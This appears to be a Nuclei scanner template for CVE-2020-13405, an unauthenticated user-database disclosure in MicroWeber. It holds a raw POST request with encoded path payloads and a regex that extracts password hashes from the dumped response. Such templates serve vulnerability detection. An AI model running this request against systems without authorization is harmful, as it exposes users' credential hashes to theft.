id: CVE-2020-13405

info:
  name: MicroWeber - Unauthenticated User Database Disclosure
  author: ritikchaddha, amit-jd
  severity: critical
  description: The PHP code for controller.php run Laravel's dump and die function on the users database. Dump and die simply prints the contents of the entire PHP variable (in this case, the users database) out to HTML.

  reference:
    - https://rhinosecuritylabs.com/research/microweber-database-disclosure/
  tags: cve,cve2020,disclosure

requests:
  - raw:
      - |
        POST /module/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Referer: {{BaseURL}}admin/view:modules/load_module:users

        module={{endpoint}}

    payloads:
      endpoint:
        - "users%2Fcontroller"
        - "modules%2Fusers%2Fcontroller"
        - "%2Fmodules%2Fusers%2Fcontroller"

    extractors:
      - type: regex
        name: password-hash
        group: 1
        part: body
        regex:
         - '<span class=sf-dump-key>password</span>" => "<span class=sf-dump-str title="60 characters">(.*)</span>'

    matchers:   
      - type: dsl
        dsl:
          - 'contains(body,"username")'
          - 'contains(body,"password")'
          - 'contains(body,"password_reset_hash")'
          - 'status_code==200'
          - 'contains(all_headers,"text/html")'
        condition: and